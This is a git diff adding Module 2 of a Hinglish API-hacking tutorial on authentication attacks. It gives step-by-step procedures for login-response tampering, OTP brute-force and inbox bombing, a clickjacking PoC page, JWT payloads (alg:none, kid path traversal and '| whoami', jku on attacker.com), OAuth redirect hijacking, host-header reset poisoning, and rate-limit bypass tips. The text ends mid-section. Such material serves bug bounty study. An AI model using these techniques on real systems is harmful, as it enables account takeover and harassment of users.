@@ -588,3 +588,995 @@ Uber ki ek private GitHub repository mein ek employee ne AWS keys commit kar di.
 Agla module chahiye toh batao – **Module 2: Authentication Bypass Techniques**? 🚀
 
 ========================================================================================
+
+## 🔐 Module 2: Authentication & Session Management Deep-Dive
+*Andar ka raasta (gateway) kitna strong hai?*
+
+**Swagat hai Mentor ji!** Module 2 mein hum API ke **gateway** ko todna seekhenge – yani **Authentication**. Agar aap API ko ek private building maano, to authentication us building ka **security guard** hai. Agar hum guard ko bypass kar lete hain, ya uski uniform pehen lete hain, to andar ghusna aasaan ho jata hai. Is module mein hum response manipulation, JWT attacks, OAuth flaws, rate limiting bypass, aur bhi bahut kuch cover karenge. Chaliye shuru karte hain!
+
+---
+
+### Topic 2.1: 🎯 Title: Response Manipulation (Login Bypass)
+*Server jhooth bole to frontend maan jaaye?*
+
+#### 🐣 Samjhane ke liye (Analogy)
+Socho tum school mein ho aur tumhe Principal se milna hai. Guard ne kaha "Principal sahab nahi milenge". Tumne Principal ka phone milaya, unhone kaha "Aajao beta". Ab tum guard ko jhooth bolte ho ki "Principal ne bulaya hai" aur guard maan jaata hai bina verify kiye. Yahan **guard = frontend (browser)**, **Principal ka phone = server response**.
+
+#### 📖 Technical Definition
+Response Manipulation tab hota hai jab frontend application server ke HTTP response par **blindly trust** karti hai, bina response body ko properly parse kiye. Agar frontend sirf **status code** (200 OK, 403 Forbidden) check karta hai na ki actual response body mein success flag, to attacker server se aaya 403 Forbidden ko intercept karke 200 OK mein badal kar frontend ko fool kar sakta hai.
+
+#### 🧠 Zaroorat Kyun Hai?
+Ye vulnerability **authentication bypass** ka ek simple lekin powerful tarika hai. Isse aap bina valid credentials ke kisi bhi user ke account mein login kar sakte ho, agar frontend silly hai.
+
+#### 🔍 Visual - Screen Par Kya Dikhega
+Burp Suite mein:
+1. Request intercept karo login ki.
+2. Server se response aata hai:  
+   **Failed login:** `HTTP/1.1 403 Forbidden` with body `{"error":"Invalid credentials"}`  
+   **Successful login:** `HTTP/1.1 200 OK` with body `{"token":"xyz","success":true}`
+3. Tum response ko modify karoge: Failed login ka status code 200 OK kar doge, ya body mein success flag true kar doge.
+
+#### ⚙️ Under the Hood
+Frontend developers kabhi kabhi lazy programming karte hain. Jaise:
+```javascript
+fetch('/api/login', { /* credentials */ })
+  .then(response => {
+    if (response.status === 200) {
+      // Login successful, redirect
+      window.location = '/dashboard';
+    } else {
+      showError('Invalid credentials');
+    }
+  })
+```
+Is code mein sirf **status code** check ho raha hai. Response body nahi dekhi ja rahi. Isliye agar hum 403 ko 200 mein badal denge, to frontend samjhega ki login successful ho gaya.
+
+#### 💻 Hands-On Step-by-Step (Reference: Page 1-4)
+**Phase 1: Observation – Kya frontend sirf status code dekhta hai?**
+1. Burp Suite open karo aur intercept ON karo.
+2. Target website par correct credentials (e.g., `admin:admin`) daal kar login karo.
+3. Burp mein request aayegi, usse forward karo.
+4. Response aayega – maan lo `200 OK` with token.
+5. Ab is response ko forward karne se pehle, status line change karo:
+   - Original: `HTTP/1.1 200 OK`
+   - Modified: `HTTP/1.1 403 Forbidden`
+   - Response body mein token waisa hi rahne do.
+6. Forward karo aur browser dekho.
+7. **Observation:** Agar browser "Login Successful" dikhata hai (ya dashboard par le jata hai) 403 ke baad bhi, to frontend **sirf status code nahi** dekh raha, wo response body bhi dekh raha hai (success flag).  
+   Agar browser "Unauthorized" error dikhata hai, to frontend **sirf status code** dekh raha hai.
+
+**Phase 2: Exploit – Login Bypass**
+1. Ab wrong credentials daalo (e.g., `admin:wrongpass`).
+2. Burp mein response aayega `403 Forbidden` with body `{"error":"Invalid"}`.
+3. Status line modify karo: `HTTP/1.1 200 OK`.
+4. Agar body mein success flag hai (`"success":false`), to use bhi `"success":true` kar do.
+5. Forward karo.
+6. **Success:** Agar browser dashboard dikhata hai, to vulnerability confirmed! Tum bina correct password ke login kar gaye.
+
+#### ✅ Kaamyabi ki Nishani (Success vs Failure)
+- **Successful Exploit:** Wrong credentials dene par bhi 200 OK modify karne se dashboard khul gaya.
+- **Failure:** Wrong credentials par 200 OK modify karne se bhi error aaya – matlab frontend response body bhi check kar raha hai.
+
+#### ⚖️ Comparison (X vs Y)
+| Scenario | Response Status | Response Body | Frontend Behavior |
+|----------|----------------|---------------|-------------------|
+| Normal | 200 OK | `{"success":true}` | Login success |
+| Vulnerable | 403 Forbidden (modified to 200) | `{"success":false}` (unchanged) | Login success (sirf status dekha) |
+| Secure | 403 Forbidden (modified to 200) | `{"success":false}` | Login failed (body check kiya) |
+
+#### 🚫 Common Mistakes
+- Sirf status code badalna, body mein success flag nahi badalna, jabki frontend dono check kar raha ho.
+- Response manipulation ke baad verify nahi karna ki actually login hua ya nahi.
+
+#### 🤔 Agar Dimag Ghoom Rahe Hai?
+- **"Response body mein success flag bhi badal diya, lekin login nahi hua?"** – Ho sakta hai frontend token bhi validate kar raha ho. Agar token invalid hai, to login nahi hoga. Isliye correct credentials ka token copy karke use karo.
+- **"Ye vulnerability kitni common hai?"** – Purani websites mein common thi, abhi bhi kuch mobile apps mein mil jati hai.
+
+#### 🌍 Real-World Use Case
+Ek banking app mein, researchers ne dekha ki OTP verification sirf status code check kar raha tha. Unhone wrong OTP daala, response intercept kiya, 403 ko 200 mein badala, aur OTP bypass kar diya. **Critical vulnerability** thi.
+
+#### 🎨 Visual Diagram (ASCII Art)
+```
+[User] -> [Frontend] -> [API] (wrong pass)
+                         [API] -> 403 Forbidden
+[Attacker intercepts] -> changes 403 to 200
+[Frontend receives 200] -> "Login successful! Redirecting..."
+[Attacker logged in]
+```
+
+#### 🛠️ Best Practices (Pro Tips)
+- **Verification (Grep-Match Method):** (Reference: Page 4)  
+  Agar correct aur wrong credentials ka response body same hai, to Intruder mein "Grep-Match" use karo:
+  1. Burp Intruder mein request bhejo.
+  2. Positions tab mein parameter ko variable mark karo (e.g., password).
+  3. Payloads tab mein passwords list daalo.
+  4. Options tab mein **Grep-Match** add karo: `"success":true` ya `"status":1` (jo bhi success flag ho).
+  5. Attack start karo. Jo bhi response mein ye flag match karega, wo highlight hoga – matlab valid password mil gaya.
+- Response manipulation ke baad, browser ke network tab mein dekho ki actual request response kya aaya.
+
+#### ❓ FAQ
+1. **Q: Response manipulation se session token bhi mil sakta hai?**  
+   A: Haan, agar correct credentials ka token copy kar ke wrong credentials ke response mein daal do, to direct session mil jayega.
+2. **Q: Frontend body check kar raha hai to kya karun?**  
+   A: Body mein bhi manipulation karo – `"success":false` ko `"success":true` karo.
+3. **Q: Ye vulnerability OWASP mein hai?**  
+   A: OWASP API Top 10 mein specific nahi hai, lekin broken authentication ka part hai.
+
+#### 📝 Ek Line Mein Yaad Rakhne Ko
+**Agar frontend sirf status code dekhta hai, to 403 ko 200 bana ke andar ghus jao.**
+
+---
+
+### Topic 2.2: 🎯 Title: No-Rate Limit Attacks
+*OTP se user ki inbox blast kar do*
+
+#### 🐣 Samjhane ke liye (Analogy)
+Tum kisi dukaan par gaye aur wahan ek button hai "Free Gift". Tumne use 100 baar dabaya. Dukaan wale ne rok kyun nahi? Agar wo rokta, to tum ek baar hi dabate. Yahan **Rate Limit** wo rokne ka mechanism hai. Agar nahi hai, to tum 1000 baar OTP bhej kar user ki inbox bhar sakte ho, ya OTP brute-force kar sakte ho.
+
+#### 📖 Technical Definition
+Rate limiting ek mechanism hai jo ek specific time frame mein ek user ya IP se hone wali requests ki frequency limit karta hai. Agar API par rate limiting nahi hai, to attacker **brute-force attacks** (OTP/password guessing) ya **DoS (Denial of Service)** kar sakta hai.
+
+#### 🧠 Zaroorat Kyun Hai?
+- **OTP Brute-Force:** Agar OTP sirf 4-digit hai aur koi limit nahi, to 9999 attempts mein se koi na koi sahi ho jayega.
+- **Account Takeover:** Isse accounts hack ho sakte hain.
+- **Inbox Bombing:** User ko hundreds of OTP messages bhej kar irritate kar sakte ho.
+
+#### 🔍 Visual - Screen Par Kya Dikhega
+Burp Intruder mein:
+1. OTP verification request capture karo.
+2. OTP field ko variable mark karo (e.g., `otp=§1234§`).
+3. Payloads mein numbers daalo (0000 to 9999).
+4. Attack start karo. Har request 200 OK aayega, koi limit nahi.
+
+#### ⚙️ Under the Hood
+Server usually:
+- IP address ya user ID ke saath ek counter store karta hai.
+- Har attempt par counter increment.
+- Agar counter > threshold, to block karo.
+
+Agar ye logic missing hai, to unlimited attempts possible.
+
+#### 💻 Hands-On Step-by-Step (Reference: Page 18)
+**Exploit 1: OTP Brute-Force**
+1. Login ya password reset flow mein OTP daalne wala step dhundho.
+2. Burp mein request capture karo, jaise:
+   `POST /api/verify-otp`  
+   `{"phone":"1234567890","otp":"1234"}`
+3. Send to Intruder.
+4. OTP parameter ko `§` mein mark karo.
+5. Payloads tab mein **Numbers** select karo, from 0000 to 9999, step 1.
+6. Attack start karo. Response length dekho – jiska response length algha ho, wo successful OTP ho sakta hai.
+7. Ya **Grep-Match** use karo `"success":true`.
+
+**Exploit 2: Inbox Bombing (DoS)**
+1. OTP send request capture karo, jaise:
+   `POST /api/send-otp`  
+   `{"email":"victim@example.com"}`
+2. Is request ko **Intruder** mein bhejo, ya simple Python script likho.
+3. 1000 requests bhejo.
+4. Victim ke inbox mein 1000 OTP messages aa jayenge.
+5. **Impact:** User ka phone spam se bhar jayega, aur wo temporary block bhi ho sakta hai.
+
+#### ✅ Kaamyabi ki Nishani (Success vs Failure)
+- **Success:** 1000 requests sab 200 OK aaye, OTP brute-force successful.
+- **Failure:** 5-6 requests ke baad 429 Too Many Requests aaya – rate limiting hai.
+
+#### ⚖️ Comparison (X vs Y)
+| Attack Type | Method | Impact |
+|-------------|--------|--------|
+| OTP Brute-Force | Har possible OTP try karna | Account takeover |
+| Inbox Bombing | Har second OTP bhejna | User annoyance, SMS costs |
+| Password Brute-Force | Common passwords try karna | Account takeover |
+
+#### 🚫 Common Mistakes
+- Sirf login attempts check karna, password reset OTP ko ignore karna.
+- IP-based rate limiting ko bypass karne ke liye VPN/proxy use nahi karna.
+
+#### 🤔 Agar Dimag Ghoom Rahe Hai?
+- **"OTP 6-digit hai to 10 lakh attempts lagenge. Itna time kaise milega?"** – Isliye rate limit ka issue tab critical hota hai jab OTP 4-digit ho (9999 attempts), ya 6-digit ho lekin koi lockout na ho. Phir bhi automated tool se raat bhar chhod do, mil jayega.
+- **"Server ne IP block kar diya to?"** – Rotating proxies use karo, ya different headers (`X-Forwarded-For`) se bypass try karo.
+
+#### 🌍 Real-World Use Case
+WhatsApp par ek flaw tha ki OTP verification unlimited attempts ki ja sakti thi. Attackers ne iska fayda utha kar accounts hack kiye. Baad mein rate limiting implement ki gayi.
+
+#### 🛠️ Best Practices (Pro Tips)
+- **Turbo Intruder** use karo for high-speed attacks.
+- Python script mein **proxies** rotate karo:
+  ```python
+  proxies = {'http': 'http://proxy1.com', 'https': 'https://proxy1.com'}
+  requests.post(url, json=data, proxies=proxies)
+  ```
+- Agar response time mein difference ho, to usse bhi brute-force mein help milti hai.
+
+#### ❓ FAQ
+1. **Q: Rate limiting bypass ke aur tarike?**  
+   A: IP rotation, headers manipulation (`X-Forwarded-For`), ya multiple accounts use karna.
+2. **Q: Kaunsa OTP vulnerable hota hai?**  
+   A: Sirf numeric OTP (4-6 digit) brute-force ho sakta hai. Alphanumeric mushkil hai.
+3. **Q: Bug bounty mein iska kya severity hai?**  
+   A: OTP brute-force se account takeover possible hai to **Critical** ya **High**.
+
+#### 📝 Ek Line Mein Yaad Rakhne Ko
+**Jahan limit nahi, wahan brute-force se account tod do.**
+
+---
+
+### Topic 2.3: 🎯 Title: Clickjacking (Session Riding)
+*User ko dhokha de kar button daba do*
+
+#### 🐣 Samjhane ke liye (Analogy)
+Tum market mein khade ho. Ek banda aaya aur bola "Ye button daba do, free ice cream milega". Tumne daba diya. Pata chala ki wo button tumhare bank ka "Transfer Money" button tha aur tumne apne saare paise transfer kar diye. Yahan **browser = tum**, **hacker ka page = wo banda**, **transparent iframe = chhupa button**.
+
+#### 📖 Technical Definition
+Clickjacking (UI redressing) mein attacker ek transparent iframe mein target website ko load karta hai, aur uske upar ek attractive button ya link rakhta hai. User jab attractive button par click karta hai, actually wo target website ke button par click kar deta hai, kyunki wo already logged-in hai. Isse **session riding** bhi kehte hain.
+
+#### 🧠 Zaroorat Kyun Hai?
+Isse attacker user ki permission ke bina sensitive actions kara sakta hai – jaise account delete karna, password change karna, money transfer karna.
+
+#### 🔍 Visual - Screen Par Kya Dikhega
+Burp Suite mein:
+1. Kisi bhi response par right-click karo.
+2. **"Check for Clickjacking"** option select karo.
+3. Burp ek HTML page generate karega jo target ko iframe mein load karega.
+4. Agar page iframe mein load ho jata hai, to vulnerable hai.
+
+#### ⚙️ Under the Hood
+Clickjacking se bachne ke liye websites **X-Frame-Options** header use karti hain:
+- `X-Frame-Options: DENY` – koi bhi iframe mein load nahi ho sakta.
+- `X-Frame-Options: SAMEORIGIN` – sirf same domain ke iframe mein load ho sakta hai.
+
+Agar ye header missing hai, to koi bhi website iframe mein target load kar sakti hai.
+
+#### 💻 Hands-On Step-by-Step (Reference: Page 18-19)
+**Phase 1: Testing for Clickjacking**
+1. Burp Suite mein kisi bhi sensitive page ki request dhundho (e.g., `GET /delete-account`).
+2. Response select karo, right-click -> **"Check for Clickjacking"**.
+3. Burp ek HTML file generate karega. Use browser mein open karo.
+4. **Observation:** Agar target page iframe mein dikh raha hai, to vulnerable hai.
+
+**Phase 2: Creating a Proof-of-Concept**
+1. Ye HTML code likho:
+```html
+<html>
+<head>
+  <title>Clickjacking PoC</title>
+  <style>
+    iframe {
+      width: 500px;
+      height: 500px;
+      position: absolute;
+      top: 0;
+      left: 0;
+      opacity: 0.5; /* Initially transparent rakh sakte ho */
+      z-index: 2;
+    }
+    button {
+      position: absolute;
+      top: 200px;
+      left: 200px;
+      z-index: 1;
+      font-size: 50px;
+    }
+  </style>
+</head>
+<body>
+  <button>Click for Free Ice Cream!</button>
+  <iframe src="https://target.com/delete-account"></iframe>
+</body>
+</html>
+```
+2. Is file ko server par host karo ya locally open karo.
+3. User ko ye page bhejo.
+4. Jab user button click karega, actually wo iframe ke andar "Delete Account" button par click karega.
+
+#### ✅ Kaamyabi ki Nishani (Success vs Failure)
+- **Success:** Target page iframe mein load ho raha hai, aur user ko dhokha de kar action karaya ja sakta hai.
+- **Failure:** Page iframe mein load nahi hota (blank aata hai) – `X-Frame-Options` present hai.
+
+#### ⚖️ Comparison (X vs Y)
+| Header | Behavior | Security |
+|--------|----------|----------|
+| No header | Kisi bhi site ke iframe mein load ho sakta hai | ❌ Vulnerable |
+| `X-Frame-Options: DENY` | Kisi bhi iframe mein load nahi hoga | ✅ Secure |
+| `X-Frame-Options: SAMEORIGIN` | Same domain ke iframe mein load hoga | ⚠️ Partial secure |
+
+#### 🚫 Common Mistakes
+- Sirf login page check karna, sensitive action pages (delete, transfer) miss karna.
+- Ye assume karna ki agar page iframe mein load ho raha hai to exploit possible hai. Actually, user ko click dila pana bhi important hai.
+
+#### 🤔 Agar Dimag Ghoom Rahe Hai?
+- **"User ko click kaise dilayenge?"** – Attractive offers, games, ya urgent messages ka sahara lo. Social engineering se.
+- **"Opacity 0 kar di to user dekhega nahi iframe, to click kaise karega?"** – Opacity 0 karne se iframe invisible ho jayega, lekin user attractive button par click karega jo uske upar hai. Lekin us attractive button ke click event ko iframe tak forward karna padega – isliye opacity 0.5 rakho taaki debug ho sake, final exploit mein opacity 0 kar do.
+
+#### 🌍 Real-World Use Case
+Facebook pe clickjacking attack hua tha jisme users ko "Like" button par click karaya gaya bina unki jaankari ke. Isse pages ki likes artificially badh gayi.
+
+#### 🛠️ Best Practices (Pro Tips)
+- **Double-check:** Agar `X-Frame-Options` missing hai, to bhi kuch modern browsers `frame-ancestors` CSP header use karte hain. Use bhi check karo:
+  `Content-Security-Policy: frame-ancestors 'none';`
+- Bug bounty mein report karte waqt, PoC mein iframe ko visible rakh sakte ho taaki triage team samajh sake.
+
+#### ❓ FAQ
+1. **Q: Clickjacking se session hijack ho sakta hai?**  
+   A: Nahi, session hijack nahi hota, but user ke session ka fayda utha kar actions karaye ja sakte hain.
+2. **Q: Iska OWASP Top 10 mein kya number hai?**  
+   A: OWASP API Top 10 mein specifically nahi hai, but ye client-side attack hai.
+3. **Q: Mobile apps mein clickjacking possible hai?**  
+   A: Mobile apps mein WebViews mein ho sakta hai, agar settings sahi nahi hain.
+
+#### 📝 Ek Line Mein Yaad Rakhne Ko
+**Agar iframe mein load ho raha hai, to user ko dhokha de kar kuch bhi karwa lo.**
+
+---
+
+### Topic 2.4: 🎯 Title: JWT Attacks – The JSON Web Token Manipulation
+*Apna khud ka token bana lo*
+
+#### 🐣 Samjhane ke liye (Analogy)
+Socho tumhe concert mein jaana hai. Ticket counter par tumhe ek paper ticket milta hai jisme likha hai "VIP Access". Tum ticket lekar andar ghus jaate ho. Ab agar tum ticket ke paper par "VIP" ko erase kar ke "Backstage" likh do, aur guard wahi ticket check kare bina signature verify kiye, to tum backstage mein ghus jaoge. Yahan **ticket = JWT**, **signature = server ka secret**.
+
+#### 📖 Technical Definition
+JWT (JSON Web Token) ek stateless authentication mechanism hai. Ye teen parts mein banta hai: `header.payload.signature`. Header aur payload base64 encoded hote hain, aur signature server ke secret se sign hota hai. Agar server signature properly verify nahi karta, to attacker payload modify kar ke apna role change kar sakta hai.
+
+#### 🧠 Zaroorat Kyun Hai?
+JWT attacks se aap **privilege escalation** kar sakte ho – normal user se admin ban sakte ho, ya kisi aur user ban sakte ho. Ye API hacking mein sabse common aur critical vulnerabilities hain.
+
+#### 🔍 Visual - Screen Par Kya Dikhega
+JWT kuch aisa dikhta hai:
+```
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9.4x1jU8JkL9KxJkL9KxJkL9K
+```
+Dots se separated teen parts.
+
+#### ⚙️ Under the Hood
+JWT verification mein teen steps:
+1. Header se algorithm pata karo (`alg`).
+2. Signature verify karo using secret.
+3. Payload mein se user info lo.
+
+Agar koi step galat hai, to attack possible hai.
+
+#### 💻 Hands-On Step-by-Step
+**Attack 1: None Algorithm Attack**
+1. Token capture karo.
+2. Header mein `"alg":"HS256"` ko `"alg":"none"` karo.
+3. Signature part hata do (empty rakho).
+4. Payload modify karo (e.g., `"role":"admin"`).
+5. New token banao: `eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.`
+6. Request mein token replace karo.
+7. **Success:** Agar server `alg:none` accept karta hai to admin access mil jayega.
+
+**Attack 2: Algorithm Confusion (RS256 to HS256)**
+1. Agar server RS256 use kar raha hai (asymmetric), to public key mil sakti hai (e.g., from `/jwks.json`).
+2. Public key ko HS256 (symmetric) ke liye secret ki tarah use karo.
+3. New token banao with HS256 and public key as secret.
+4. Server verify karega to public key se hi hoga, aur accept kar lega.
+5. Tool: `jwt_tool` use karo:
+   `python jwt_tool.py <token> -X a -pk public.key`
+
+**Attack 3: kid (Key ID) Injection**
+1. Token header mein `"kid":"key1"` hota hai.
+2. Agar server `kid` ko path ki tarah use karta hai, to try karo:
+   - `"kid":"../../../../dev/null"` – ye null key use karega.
+   - `"kid":"file:///etc/passwd"` – LFI try karo.
+3. Command injection bhi try karo: `"kid":"| whoami"`
+
+**Attack 4: jku (JWK Set URL) Injection**
+1. Header mein `"jku":"https://server.com/jwks.json"` hota hai.
+2. Apna khud ka JWKS server banao with your public key.
+3. Header mein `"jku":"https://attacker.com/jwks.json"` set karo.
+4. Apne private key se sign karo.
+5. Server aapke JWKS se public key leke verify karega, aur accept kar lega.
+
+#### ✅ Kaamyabi ki Nishani (Success vs Failure)
+- **Success:** Token modify kar ke admin access mil gaya, ya kisi aur user ka data mila.
+- **Failure:** Server "Invalid signature" error deta hai.
+
+#### ⚖️ Comparison (X vs Y)
+| Attack | Method | Difficulty |
+|--------|--------|------------|
+| None Algorithm | `alg:none` | Easy |
+| Algorithm Confusion | RS256 to HS256 | Medium |
+| kid Injection | Path traversal | Medium |
+| jku Injection | External JWKS | Hard |
+
+#### 🚫 Common Mistakes
+- Sirf HS256 tokens par focus karna, RS256 ignore karna.
+- `kid` injection mein path traversal ke alawa SQLi bhi ho sakti hai, ignore karna.
+
+#### 🤔 Agar Dimag Ghoom Rahe Hai?
+- **"Public key kaise milegi?"** – Often `/jwks.json`, `/.well-known/jwks.json`, ya response headers mein.
+- **"None algorithm kaise try karun?"** – Header base64 decode karo, modify karo, fir base64 encode karo aur signature part khali rakho.
+
+#### 🌍 Real-World Use Case
+Paytm ki API mein JWT vulnerability thi jisme `kid` parameter SQL injection vulnerable tha. Attacker `kid` mein SQLi daal kar secret nikal sakta tha.
+
+#### 🛠️ Best Practices (Pro Tips)
+- **jwt_tool** install karo: `git clone https://github.com/ticarpi/jwt_tool`
+- **Burp Extension:** "JSON Web Tokens" extension use karo.
+- Manual tampering ke liye `jwt.io` website use kar sakte ho.
+
+#### ❓ FAQ
+1. **Q: JWT secret kaise pata karein?**  
+   A: Weak secret hai to crack karo `hashcat` se. Common wordlist use karo.
+2. **Q: JWKS kya hai?**  
+   A: JSON Web Key Set – server ke public keys ka set.
+3. **Q: Kya JWT hamesha vulnerable hota hai?**  
+   A: Nahi, proper implementation secure hai.
+
+#### 📝 Ek Line Mein Yaad Rakhne Ko
+**JWT ka header aur payload kholo, algorithm badlo, signature hatao, aur admin ban jao.**
+
+---
+
+### Topic 2.5: 🎯 Title: OAuth 2.0 Misconfigurations
+*Dusre ke account se login karo*
+
+#### 🐣 Samjhane ke liye (Analogy)
+Tum kisi hotel mein gaye. Wahan bola "Google se login karo". Tum Google login karte ho, aur hotel ko apna Google ID ka pata chalta hai. Ab agar hotel wala Google se pooche "Iska email kya hai?" bina tumhari permission ke, to tumhari privacy leak ho jayegi. Yahan **Google = OAuth provider**, **hotel = client app**.
+
+#### 📖 Technical Definition
+OAuth 2.0 ek authorization framework hai jisme user kisi third-party app ko apne resources ka limited access de sakta hai bina apni credentials share kiye. Misconfigurations mein attacker authorization code hijack kar sakta hai, ya redirect_uri manipulate kar sakta hai.
+
+#### 🧠 Zaroorat Kyun Hai?
+OAuth flaws se aap kisi bhi user ke account mein login kar sakte ho bina unka password jaane, agar client app ne OAuth theek implement nahi kiya.
+
+#### 🔍 Visual - Screen Par Kya Dikhega
+OAuth flow:
+1. User clicks "Login with Google"
+2. Redirect to `accounts.google.com/o/oauth2/auth?client_id=123&redirect_uri=https://client.com/callback&response_type=code`
+3. User grants permission
+4. Google redirects to `client.com/callback?code=AUTH_CODE`
+5. Client server exchanges code for token.
+
+#### ⚙️ Under the Hood
+Main components:
+- **Client ID:** App ki public identity
+- **Client Secret:** App ka private key (server-side)
+- **Redirect URI:** Jahan code bhejna hai
+- **Authorization Code:** Temporary code jo token ke liye exchange hota hai
+- **Access Token:** Actual resource access ke liye
+
+#### 💻 Hands-On Step-by-Step
+**Attack 1: Redirect URI Manipulation**
+1. OAuth login flow start karo.
+2. Burp mein authorize request capture karo.
+3. `redirect_uri` parameter ko modify karo apne domain par:
+   `redirect_uri=https://attacker.com/callback`
+4. Agar server allowed redirect URIs ko properly validate nahi karta, to authorization code attacker ke server par aa jayega.
+5. Attacker ye code use kar ke token le sakta hai.
+
+**Attack 2: CSRF on OAuth**
+1. Jab user OAuth login karta hai, ek `state` parameter hota hai jo CSRF token ka kaam karta hai.
+2. Agar `state` missing hai ya predictable hai, to attacker apna OAuth code kisi aur user ke account se link kar sakta hai.
+
+**Attack 3: Code Leakage via Referer**
+1. Jab Google redirect karta hai client callback par, URL mein `code` hota hai.
+2. Agar client page mein koi external resource (image, script) load ho raha hai, to `Referer` header mein `code` leak ho sakta hai.
+
+#### ✅ Kaamyabi ki Nishani (Success vs Failure)
+- **Success:** Authorization code apne server par mil gaya, use token exchange kiya, aur user ka account access kar liya.
+- **Failure:** Server invalid redirect_uri error dega, ya code validate nahi hoga.
+
+#### ⚖️ Comparison (X vs Y)
+| Attack | Target | Impact |
+|--------|--------|--------|
+| Redirect URI Manipulation | Authorization code hijack | Account takeover |
+| CSRF | State parameter missing | Account linking |
+| Code Leakage | Referer header | Token theft |
+
+#### 🚫 Common Mistakes
+- Sirf client_id check karna, redirect_uri ko ignore karna.
+- `state` parameter implement na karna.
+- Code ko URL mein expose karna (should be POST).
+
+#### 🤔 Agar Dimag Ghoom Rahe Hai?
+- **"Redirect URI validate kaise hota hai?"** – Client registration ke time allowed URIs list di jati hai. Server check karta hai ki redirect_uri us list mein hai ya nahi. Agar partial match check ho raha hai, to `https://client.com/callback.attacker.com` bhi accept ho sakta hai.
+
+#### 🌍 Real-World Use Case
+Facebook OAuth mein ek flaw tha ki `redirect_uri` properly validate nahi hota tha. Attacker code hijack kar ke kisi bhi user ka account le sakta tha.
+
+#### 🛠️ Best Practices (Pro Tips)
+- OAuth testing ke liye **OAuth 2.0 Pentesting Guide** padho.
+- Burp Extension: **OAuth Scan** use karo.
+- Manual testing mein har redirect_uri variation try karo.
+
+#### ❓ FAQ
+1. **Q: OAuth aur JWT mein kya difference?**  
+   A: OAuth authorization framework hai, JWT token format hai. OAuth JWT use kar sakta hai.
+2. **Q: Authorization code kaise hijack karun?**  
+   A: Redirect URI apne server par point karo, aur code capture karo.
+3. **Q: CSRF se kaise bachein?**  
+   A: `state` parameter use karo jo unpredictable ho.
+
+#### 📝 Line Mein Yaad Rakhne Ko
+**OAuth ka redirect_URI kholo, code apne paas bhej lo, aur account le lo.**
+
+---
+
+### Topic 2.6: 🎯 Title: Password Reset Logic Flaws
+*Password reset tod do*
+
+#### 🐣 Samjhane ke liye (Analogy)
+Maano tum apna password bhool gaye. Website par "Forgot Password" click karte ho. Wo tumhe email bhejti hai link. Ab agar wo link ka format simple ho, jaise `reset?token=123`, to tum 123,124,125 try kar sakte ho aur kisi aur ka reset kar sakte ho.
+
+#### 📖 Technical Definition
+Password reset functionality mein flaws hote hain jaise predictable tokens, token reuse, ya parameter manipulation se kisi aur ka password change kar dena.
+
+#### 🧠 Zaroorat Kyun Hai?
+Isse aap kisi bhi user ka password change kar sakte ho, account takeover kar sakte ho.
+
+#### 🔍 Visual - Screen Par Kya Dikhega
+Reset link kuch aisa:  
+`https://target.com/reset?token=abc123&user=john`
+
+#### 💻 Hands-On Step-by-Step
+**Attack 1: Predictable Tokens**
+1. Apne email par reset request karo.
+2. Token note karo: `token=123456`
+3. Dusra reset request karo, token aaya `123457`.
+4. Incrementing hai to brute-force possible hai.
+5. Victim ka email daalo aur tokens brute-force karo.
+
+**Attack 2: Host Header Injection**
+1. Reset request intercept karo.
+2. `Host` header change karo `attacker.com`.
+3. Server reset link bana sakta hai `http://attacker.com/reset?token=xyz`
+4. User link click karega to token attacker ke server par aa jayega.
+
+**Attack 3: Parameter Pollution**
+1. Reset request: `POST /reset` with `{"email":"victim@mail.com"}`
+2. Try `{"email":"victim@mail.com","email":"attacker@mail.com"}`
+3. Kya server victim ko link bhejta hai ya attacker ko?
+
+#### ✅ Kaamyabi ki Nishani
+- **Success:** Victim ka password change kar diya.
+- **Failure:** Apna hi password change ho raha hai.
+
+#### 📝 Ek Line Mein Yaad Rakhne Ko
+**Reset token weak hai to kisi ka bhi account le lo.**
+
+---
+
+### Topic 2.7: 🎯 Title: Multi-Factor Authentication (MFA) Bypass
+*Do tala tod do*
+
+#### 🐣 Samjhane ke liye (Analogy)
+Ghar par do tala lagaye hain. Ek guard ke paas, ek gate par. Agar tum guard ko bypass kar ke gate tak pahunch gaye, to ek tala todna hai. Waise hi, MFA ke baad bhi agar session handling weak hai to bypass possible hai.
+
+#### 📖 Technical Definition
+MFA bypass tab hota hai jab:
+- MFA sirf specific steps par apply ho (e.g., login par, but API calls par nahi)
+- MFA code predictable ho
+- MFA ko disable kar sakte ho
+
+#### 💻 Hands-On Step-by-Step
+**Attack 1: MFA Not Required on APIs**
+1. Login with MFA, capture session token.
+2. Ab sensitive API call karo (e.g., change password) with same token.
+3. Agar server MFA nahi maang raha, to bypass ho gaya.
+
+**Attack 2: MFA Disable via Parameter**
+1. Request mein `"mfa_enabled":true` ho sakta hai.
+2. Use `false` karo.
+
+#### 📝 Ek Line Mein Yaad Rakhne Ko
+**MFA sirf login par hai, baaki APIs par nahi, to MFA ka kya fayda?**
+
+---
+
+
+### Topic 2.4: 🎯 Title: Session Security – Fixation, Rotation, Concurrency
+*Session ID se khelo, account le lo*
+
+#### 🐣 Samjhane ke liye (Analogy)
+Socho tum ek party mein jaate ho. Guard tumhe ek slip deta hai jisme number likha hai `123`. Tum andar jao, party karo. Jab wapas aao, guard slip check karta hai aur andar jaane deta hai. Ab agar guard slip ka number change nahi karta, toh koi aur tumhari slip copy kar ke aake bol sakta hai "Mera number bhi `123` hai" aur andar ghus jayega. Yahan **slip = session ID**, **guard = server**.
+
+#### 📖 Technical Definition
+Session security ka matlab hai ki server har user ko ek unique session ID deta hai, aur us ID se user ki identity maintain karta hai. Agar ye session ID **predictable**, **static**, ya **poorly managed** ho, toh attacker usse hijack kar ke user ka account le sakta hai.
+
+#### 🧠 Zaroorat Kyun Hai?
+Session fixation, session hijacking, concurrent session issues – ye sab flaws se aap bina password ke kisi bhi user ke account mein ghus sakte ho.
+
+#### 🔍 Visual - Screen Par Kya Dikhega
+Burp Suite mein:
+- Login se pehle: `Cookie: PHPSESSID=abc123`
+- Login ke baad: `Cookie: PHPSESSID=abc123` (same) – **Vulnerable!**
+- Login ke baad: `Cookie: PHPSESSID=xyz789` (changed) – **Secure**.
+
+#### ⚙️ Under the Hood
